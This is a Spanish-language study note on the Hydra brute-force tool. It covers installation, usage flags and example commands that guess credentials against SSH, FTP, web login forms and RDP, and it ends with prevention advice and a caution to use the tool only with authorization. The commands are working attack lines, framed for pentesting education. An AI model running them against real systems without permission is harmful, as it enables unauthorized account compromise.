---
title: "Hydra"
date: 2026-01-26
tags:
  - ciberseguridad
  - herramientas
---
### **Hydra: Fuerza Bruta y Ataques de Autenticación**


> **Relacionado**: [[01-Ciberseguridad/Fundamentos/ELPSCRK/DICCIONARIOS|DICCIONARIOS]]. [[01-Ciberseguridad/Herramientas/IDOR|IDOR]]. [[00-Inicio/HOME|HOME]]. [[02-Ciencias-Computacion/Redes/Herramientas|Herramientas]]. [[01-Ciberseguridad/Fundamentos/owasp|owasp]].

**Hydra** es una herramienta de código abierto utilizada para realizar ataques de **fuerza bruta** contra distintos protocolos de autenticación. Es rápida, flexible y compatible con una gran cantidad de servicios, lo que la convierte en una de las herramientas más utilizadas en pruebas de seguridad y pentesting.

---

## ** Características Principales**

- **Ataques de fuerza bruta**: Permite probar múltiples combinaciones de usuario y contraseña hasta encontrar credenciales válidas.
- **Soporte para múltiples protocolos**: Puede atacar **HTTP, HTTPS, FTP, SSH, SMB, RDP, MySQL, PostgreSQL, Telnet, VNC, SNMP**, entre muchos otros.
- **Modo multihilo**: Usa varios hilos en paralelo para acelerar los ataques.
- **Compatibilidad con diccionarios**: Puede usar listas de usuarios y contraseñas predefinidas o generadas en tiempo real.
- **Extensibilidad**: Se puede combinar con otras herramientas como `crunch` para generar listas de contraseñas dinámicas.

---

## ** Instalación en Linux (Kali, Debian, Ubuntu)**

Hydra suele venir preinstalado en **Kali Linux**, pero si necesitas instalarlo en otro sistema basado en Debian, usa:

```bash
sudo apt update && sudo apt install hydra -y
```

Para verificar que se instaló correctamente, ejecuta:

```bash
hydra -h
```

Si usas **Arch Linux** o derivadas (Manjaro, EndeavourOS), puedes instalarlo con:

```bash
sudo pacman -S hydra
```

Para macOS, si tienes **Homebrew**, usa:

```bash
brew install hydra
```

---

## **️ Uso Básico de Hydra**

El comando general para ejecutar un ataque con Hydra es:

```bash
hydra -L lista_usuarios.txt -P lista_passwords.txt servicio://IP -V
```

- `-L lista_usuarios.txt`: Archivo con nombres de usuario a probar.
- `-P lista_passwords.txt`: Archivo con contraseñas a probar.
- `servicio://IP`: Especifica el protocolo y la dirección IP del objetivo.
- `-V`: Muestra cada intento en la terminal.

### **Ejemplo: Ataque SSH**

Si queremos probar credenciales en un servidor **SSH** con IP `192.168.1.100`, usamos:

```bash
hydra -L usuarios.txt -P passwords.txt ssh://192.168.1.100 -V
```

Si conocemos el usuario y solo queremos probar contraseñas:

```bash
hydra -l root -P passwords.txt ssh://192.168.1.100 -V
```

---

## ** Ataques a Distintos Servicios**

### **Ataque a FTP**

```bash
hydra -l admin -P rockyou.txt ftp://192.168.1.200 -V
```

### **Ataque a HTTP (formulario web login)**

Si el formulario de login de una página web envía credenciales a `/login.php`, podemos hacer:

```bash
hydra -l admin -P passwords.txt 192.168.1.150 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

Donde:

- `/login.php:user=^USER^&pass=^PASS^`: Define el formulario con los campos de usuario y contraseña.
- `F=incorrect`: Indica el mensaje de error cuando la autenticación falla.

### **Ataque a RDP (Escritorio Remoto en Windows)**

```bash
hydra -L usuarios.txt -P passwords.txt rdp://192.168.1.250 -V
```

---

## ** ¿Cómo Prevenir un Ataque de Hydra?**

- **Usar contraseñas seguras** y políticas de autenticación robustas.
- **Activar bloqueos de cuenta** después de varios intentos fallidos.
- **Implementar CAPTCHA** en formularios de login.
- **Monitorear logs** en servidores para detectar intentos masivos de autenticación.
- **Usar autenticación multifactor (MFA)**.

---

## ** Conclusión**

Hydra es una herramienta poderosa para realizar pruebas de seguridad en autenticación, pero debe usarse **solo en entornos legales y con permisos adecuados**. Su capacidad para realizar ataques de fuerza bruta en múltiples protocolos la convierte en una herramienta imprescindible para pentesters y auditores de seguridad.